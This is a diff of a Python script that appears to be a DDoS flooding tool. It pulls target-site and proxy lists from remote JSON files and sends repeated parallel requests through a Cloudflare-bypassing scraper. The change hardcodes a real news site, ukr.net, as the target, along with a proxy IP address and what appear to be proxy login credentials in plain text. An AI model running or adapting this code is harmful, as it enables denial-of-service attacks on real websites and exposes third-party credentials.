@@ -8,16 +8,18 @@ from aiocfscrape import CloudflareScraper
 from aiohttp import ClientTimeout
 from loguru import logger
 from urllib3 import disable_warnings
+from requests.auth import HTTPProxyAuth
 
-HOSTS = ['http://46.4.63.238/api.php']  # api for getting fucking sites
+# HOSTS = ['http://46.4.63.238/api.php']  # api for getting fucking sites
+HOSTS = ['https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json']
+PROX = ['https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json']
+
 TIMEOUT = ClientTimeout(
     total=20,
     connect=10,
     sock_read=10,
     sock_connect=10,
 )
-CUSTOM_PROXY = None  # can be like 'http://login:username@1.2.3.4:5678' OR 'http://1.2.3.4:5678'
-CUSTOM_PROXIES_FILE = 'list.txt'  # name of file with list of proxies, each one in separate line
 REQUESTS_PER_SITE = 50
 PARALLEL_COUNT = 20
 SHOW_REQUEST_EXCEPTIONS = False
@@ -36,30 +38,24 @@ def main():
 async def start_one():
     while True:
         try:
-            '''
             host = random.choice(HOSTS)
             content = requests.get(host).content
             data = json.loads(content)
-            url = data['site']['url']
-            url = _fix_url(url, force_https=FORCE_HTTPS)
-            '''
+
+            phost = random.choice(PROX)
+            pcontent = requests.get(phost).content
+            pdata = json.loads(pcontent)
+
+            length = len(data)
+            ind = random.randint(1, length)
+            url = data[ind]['page']
+           # prox = pdata[ind]['page']
+
+            proxies = {"http": "193.38.234.144:45785"}
+            auth = HTTPProxyAuth("Selvburykh", "Q7o3OqQ")
+            url="https://www.ukr.net/"
             async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
-               # success = await attempt(session, url)
-                success = False
-                if not success:
-                    if CUSTOM_PROXIES_FILE:
-                        proxies = _load_proxies(CUSTOM_PROXIES_FILE)
-                    else:
-                        proxies = [
-                            f'http://{proxy_data["auth"]}@{proxy_data["ip"]}'
-                            for proxy_data in data['proxy']
-                        ]
-                    random.shuffle(proxies)
-                    for proxy in proxies:
-                        url = _fix_url(proxy)
-                        success = await attempt(session, url)
-                        if success:
-                            break
+                success = await attempt(session, url)
         except Exception as e:
             logger.warning(f'Exception, retrying, exception={e}')
 
